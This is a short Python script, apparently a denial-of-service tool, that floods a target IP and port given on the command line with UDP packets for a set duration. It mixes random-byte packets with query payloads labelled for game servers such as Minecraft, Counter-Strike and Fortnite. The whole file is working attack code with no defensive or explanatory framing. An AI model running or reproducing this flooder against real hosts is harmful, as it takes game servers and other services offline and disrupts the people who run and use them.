import socket
import random
import sys
import time

def udp_payload_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Payloads de juegos + flood normal
    game_payloads = [
        # Minecraft
        b'\x00\x00\x00\x00\x00\x00\x00\x00',
        b'\x01\x00\x00\x00\x00',
        b'\xfe\xfd\x09\x00\x00\x00\x00',
        
        # Counter-Strike
        b'\xFF\xFF\xFF\xFFTSource Engine Query\x00',
        b'\xFF\xFF\xFF\xFFdetails\x00',
        
        # Among Us
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        
        # Fortnite
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        
        # Call of Duty
        b'\xFF\xFF\xFF\xFFgetinfo\x00',
        
        # Roblox
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        
        # GTA Online
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        
        # Valorant
        b'\xFF\xFF\xFF\xFF\x69\x6E\x66\x6F\x00',
    ]
    
    timeout = time.time() + duration
    
    while time.time() < timeout:
        # 70% UDP flood normal, 30% payloads de juegos
        if random.random() < 0.7:
            # Flood UDP normal (más rápido)
            for _ in range(random.randint(5, 20)):
                data = random._urandom(random.randint(512, 1450))
                sock.sendto(data, (target_ip, target_port))
        else:
            # Payload de juego
            payload = random.choice(game_payloads)
            # Añadir datos random al payload
            extra_data = random._urandom(random.randint(100, 800))
            data = payload + extra_data
            sock.sendto(data, (target_ip, target_port))
    
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit(1)
    
    udp_payload_flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
